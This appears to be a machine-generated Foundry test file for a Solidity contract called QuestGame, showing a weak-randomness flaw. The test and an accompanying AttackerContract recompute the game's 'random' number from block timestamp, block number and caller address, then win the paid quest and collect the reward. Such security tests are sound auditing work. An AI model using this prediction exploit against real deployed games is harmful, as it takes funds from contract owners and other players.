// Generation Time: 15,70s
// Input Tokens: 2635
// Output Tokens: 1470
// Reasoning Tokens: 0

// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public _contractUnderTest;
    address public attacker;

    function setUp() public {
        vm.deal(address(this), 100 ether);
        _contractUnderTest = new QuestGame{value: 10 ether}();
        attacker = address(0x1234);
        vm.deal(attacker, 10 ether);
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        vm.assume(blockTimestamp >= block.timestamp);
        vm.assume(blockTimestamp < type(uint256).max - 1 hours);
        vm.assume(blockNumber >= block.number);
        vm.assume(blockNumber < type(uint256).max - 1);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        vm.startPrank(attacker);

        uint256 predictedSeed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    attacker
                )
            )
        );
        uint256 predictedNumber = predictedSeed % 100;

        uint256 attackerBalanceBefore = attacker.balance;
        
        _contractUnderTest.attemptQuest{value: 0.1 ether}(predictedNumber);

        uint256 attackerBalanceAfter = attacker.balance;

        (uint256 exp, uint256 wins) = _contractUnderTest.getPlayerStats(attacker);
        
        assertEq(wins, 1, "Attacker should have won the quest by predicting the random number");
        assertEq(exp, 100, "Attacker should have gained 100 experience");
        assertEq(
            attackerBalanceAfter, 
            attackerBalanceBefore - 0.1 ether + 0.2 ether, 
            "Attacker should have received the reward"
        );

        vm.stopPrank();
    }

    receive() external payable {}
}

contract AttackerContract {
    QuestGame public target;

    constructor(address _target) {
        target = QuestGame(payable(_target));
    }

    function attack() external {
        uint256 predictedSeed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    address(this)
                )
            )
        );
        uint256 predictedNumber = predictedSeed % 100;

        target.attemptQuest{value: 0.1 ether}(predictedNumber);
    }

    receive() external payable {}
}
